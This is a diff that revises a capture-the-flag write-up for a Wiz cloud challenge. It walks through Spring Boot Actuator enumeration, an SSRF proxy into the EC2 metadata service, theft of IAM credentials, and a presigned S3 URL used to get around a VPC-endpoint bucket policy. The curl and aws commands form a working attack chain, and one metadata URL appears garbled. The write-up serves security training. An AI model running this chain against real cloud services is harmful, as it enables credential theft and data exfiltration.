@@ -2,12 +2,12 @@
 title: "Perimeter Leak"
 date: 2025-07-30
 draft: false
-description: "Solutions for the first challenge from WIZ utltimate cloud champion"
+description: "Writeup for the first Wiz Cloud Champions challenge: SSRF through a Spring Boot Actuator proxy endpoint into EC2 metadata, stolen IAM creds, and a presigned URL to get past a VPC-endpoint-only S3 policy"
 tags: ["ctf", "cloud", "aws"]
 aliases: ["/writeups/Wiz-Cloudsec/PerimeterLeak/"]
 ---
 
-Our first challenge starts with a brief introduction..
+The first challenge opens with barely anything to go on:
 
 ```bash
 You've discovered a Spring Boot Actuator application running on AWS: curl https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com
@@ -15,10 +15,9 @@ You've discovered a Spring Boot Actuator application running on AWS: curl https:
 user@monthly-challenge:~$ 
 ```
 
-Ok! so we are dealing with a Spring Boot Actuator application, but wait, what is even that? The official docs from baeldung states that Actuator brings production-ready features to our application. Monitoring apps, gathering metrics, etc...
-It comes with Predefined Endpoints, you can find more inforamtion 👉 [here](https://www.baeldung.com/spring-boot-actuators).
+So: a Spring Boot Actuator application. If you haven't run into one before, Actuator bolts a set of production-monitoring endpoints onto a Spring app: metrics, health checks, environment dumps, that kind of thing. Baeldung has a [solid rundown](https://www.baeldung.com/spring-boot-actuators) of what ships by default.
 
-The most interesting Endpoint is `/actuator/env`, CURLing it returnes some valuable data! such as the S3 bucket name! and some other info about the ec2 instance ;)
+`/actuator/env` is the one worth hitting first. Curling it dumps the app's environment, including the S3 bucket name and a few details about the EC2 instance underneath it:
 
 ```bash
 user@monthly-challenge:~$ curl -s https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com/actuator/env | jq | grep -i bucket -A2 -B2
@@ -31,9 +30,9 @@ user@monthly-challenge:~$ curl -s https://ctf:88sPVWyC2P3p@challenge01.cloud-cha
         "LOGNAME": {
 ```
 
-Another interesting Endpoint is the `/actuator/mappings`, which provides information about the application's request mappings and lists all the Endpoints within the applicatiopn.
+`/actuator/mappings` is the other one worth checking; it lists every request mapping the application has, endpoints included.
 
-What attracts me the most is this endpoint, which is a proxy that takes `url` as param!
+One entry stands out: a proxy endpoint that takes a `url` parameter.
 
 ```json
 {
@@ -64,9 +63,9 @@ What attracts me the most is this endpoint, which is a proxy that takes `url` as
             },
 ```
 
-The first thing that came straight to my mind after knowing that the application is running in EC2 instance, is trying to send a GET request to the 169-254 metadata server! and yup, it did work! but we are unauthorized!
+Knowing the app runs on EC2, the obvious next move is a GET to the 169.254 metadata server through that proxy. It works — but comes back unauthorized.
 
-No problem, lets kindly request a temporary token from the metadata server!
+Fine. Ask the metadata server for a temporary token instead:
 
 ```bash
 TOKEN=$(curl -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" -XPUT https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com/proxy?url=http://169.254.169.254/latest/api/token)
@@ -101,7 +100,7 @@ services/
 system
 ```
 
-Okay, thass cool! lets go ahead and grab the iam security creds and see what we can do next!
+Token in hand, next stop is the instance's IAM credentials:
 
 ```json
 user@monthly-challenge:~$ curl -H "X-aws-ec2-metadata-token: $TOKEN" https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com/proxy?url=http://169.meta-data/iam/security-credentials/challenge01-5592368
@@ -116,7 +115,7 @@ user@monthly-challenge:~$ curl -H "X-aws-ec2-metadata-token: $TOKEN" https://ctf
   "Expiration" : "2025-09-06T18:59:09Z"
 ```
 
-After configuring the aws creds, we can now see whats inside the bucket!
+With those creds configured, the bucket opens up:
 
 ```bash
 user@monthly-challenge:~$ aws s3 ls s3://challenge01-470fXXX --recursive
@@ -124,15 +123,14 @@ user@monthly-challenge:~$ aws s3 ls s3://challenge01-470fXXX --recursive
 2025-06-16 22:01:49         51 private/flag.txt
 ```
 
-For a moment, I though I got the flag! but it didn't end here...
-I tried to copy the content of flag.txt object locally but I got a frobbiden err msg!
+For a second there I thought that was it. It wasn't — pulling the object down locally throws a forbidden error:
 
 ```bash
 user@monthly-challenge:~$ aws s3 cp s3://challenge01-XXX/private/flag.txt --profile p1 flag
 fatal error: An error occurred (403) when calling the HeadObject operation: Forbidden
 ```
 
-Why? this is because of the S3 policy, which says that you cannot get any object under /private/* out of the S3 bucket, unless the request is coming from the vpc id `vpce-0dfd8b6aa1642a0570`!
+The bucket policy explains why: nothing under `/private/*` leaves the bucket unless the request comes from VPC endpoint `vpce-0dfd8b6aa1642a0570`.
 
 ```bash
 user@monthly-challenge:~$ aws s3api get-bucket-policy --profile p1 --bucket challenge01-470fXXX | jq
@@ -141,9 +139,9 @@ user@monthly-challenge:~$ aws s3api get-bucket-policy --profile p1 --bucket chal
 }
 ```
 
-Remember the `/proxy` endpoint we discovered a while ago under `/actuator/mappings`? This will allow us to send a request from the application which is running in the EC2 instance that is provisionned on the same VPC.
+That `/proxy` endpoint from `/actuator/mappings` earlier is exactly what's needed here — it lets requests originate from the EC2 instance itself, which sits on that same VPC.
 
-Its actually very simple, we just have to presign an url for the S3 bucket, and send the request from the application using the /proxy endpoint! and just like that we get the flag of the first challenge :D
+So: presign a URL for the object, then fire it through `/proxy` so the request comes from inside the VPC instead of from me. First challenge, flag secured.
 
 ```bash
 user@monthly-challenge:~$ URL=$(aws s3 presign s3://challenge01-470fXXXX/private/flag.txt --profile p1 | jq -sRr @uri)
